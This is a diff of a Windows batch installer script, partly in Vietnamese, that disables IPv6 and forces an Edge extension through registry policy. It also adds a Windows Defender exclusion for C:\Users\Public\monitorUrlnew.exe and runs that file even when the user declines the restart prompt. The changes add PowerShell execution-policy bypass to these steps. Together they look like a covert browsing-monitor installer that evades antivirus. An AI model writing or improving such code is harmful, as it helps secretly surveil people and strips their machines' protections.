@@ -15,8 +15,8 @@ if not exist "%TARGET_DIR%" (
     mkdir "%TARGET_DIR%"
 )
 
-:: === Disable IPv6 on all network adapters ===
-powershell -Command "Disable-NetAdapterBinding -Name '*' -ComponentID ms_tcpip6 -PassThru -ErrorAction SilentlyContinue"
+:: === Disable IPv6 properly on all network adapters ===
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | ForEach-Object { Disable-NetAdapterBinding -Name $_.Name -ComponentID ms_tcpip6 -PassThru -ErrorAction SilentlyContinue }"
 
 :: === Delete old file if it exists ===
 if exist "%TARGET_DIR%\%TARGET_FILE%" (
@@ -86,13 +86,12 @@ reg add "HKLM\Software\Policies\Microsoft\Edge\ExtensionInstallForcelist" /v 3 /
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\monitorUrlnew.exe'"
 
 :: === Xác nhận khởi động lại bằng popup PowerShell ===
-powershell -Command ^
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "Add-Type -AssemblyName System.Windows.Forms; ^
-$r = [System.Windows.Forms.MessageBox]::Show('Khởi động lại máy để hoàn tất cài đặt?', 'Yêu cầu khởi động lại', 'YesNo', 'Question'); ^
-if ($r -eq 'Yes') { Start-Sleep -Seconds 3; shutdown /r /t 10 /c 'Máy sẽ khởi động lại để hoàn tất cài đặt.' } ^
-else {
-    Start-Process -FilePath 'C:\Users\Public\monitorUrlnew.exe' -WindowStyle Hidden
-    exit
-}"
+$result = [System.Windows.Forms.MessageBox]::Show('Khởi động lại máy để hoàn tất cài đặt?', 'Yêu cầu khởi động lại', [System.Windows.Forms.MessageBoxButtons]::YesNo, [System.Windows.Forms.MessageBoxIcon]::Question); ^
+if ($result -eq [System.Windows.Forms.DialogResult]::Yes) { ^
+Start-Sleep -Seconds 3; shutdown /r /t 10 /c 'Máy sẽ khởi động lại để hoàn tất cài đặt.' ^
+} else { ^
+Start-Process -FilePath 'C:\Users\Public\monitorUrlnew.exe' }"
 echo Done all setup. Exiting script...
 exit /b 0
